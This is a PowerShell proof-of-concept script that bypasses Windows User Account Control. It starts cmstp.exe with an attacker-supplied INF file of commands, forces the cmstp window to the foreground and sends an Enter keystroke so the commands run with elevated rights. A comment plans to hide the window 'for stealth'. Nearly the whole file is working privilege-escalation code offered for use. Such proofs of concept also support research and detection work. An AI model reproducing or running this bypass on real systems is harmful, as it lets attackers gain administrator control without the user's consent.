# UAC Bypass poc using SendKeys
# Version 1.0
# Author: Oddvar Moe
# Functions borrowed from: https://powershell.org/forums/topic/sendkeys/
# Todo: Hide window on screen for stealth
# Todo: Make script edit the INF file for command to inject...

# Point this to your INF file containing your juicy commands...
$InfFile = "C:\Temp\UACBypass.inf"

Function Get-Hwnd
{
  [CmdletBinding()]
    
  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
  )
  Process
    {
        $ErrorActionPreference = 'Stop'
        Try 
        {
            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
        }
        Catch 
        {
            $hwnd = $null
        }
        $hash = @{
        ProcessName = $ProcessName
        Hwnd        = $hwnd
        }
        
    New-Object -TypeName PsObject -Property $hash
    }
}

function Set-WindowActive
{
  [CmdletBinding()]

  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
  )
  
  Process
  {
    $memberDefinition = @'
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

'@

    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
    If ($hwnd) 
    {
      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
      [User32.Api]::SetForegroundWindow($hwnd)
      [User32.Api]::ShowWindow($hwnd, 5)
    }
    Else 
    {
      [string] $hwnd = 'N/A'
    }

    $hash = @{
      Process = $Name
      Hwnd    = $hwnd
    }
        
    New-Object -TypeName PsObject -Property $hash
  }
}

#Needs Windows forms
add-type -AssemblyName System.Windows.Forms

#Command to run
$ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"
#$ps.Arguments = "/au C:\Temp\UACBypass.inf"
$ps.Arguments = "/au $InfFile"
$ps.UseShellExecute = $false

#Start it
[system.diagnostics.process]::Start($ps)

do
{
	# Do nothing until cmstp is an active window
}
until ((Set-WindowActive cmstp).Hwnd -ne 0)


#Activate window
Set-WindowActive cmstp

#Send the Enter key
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
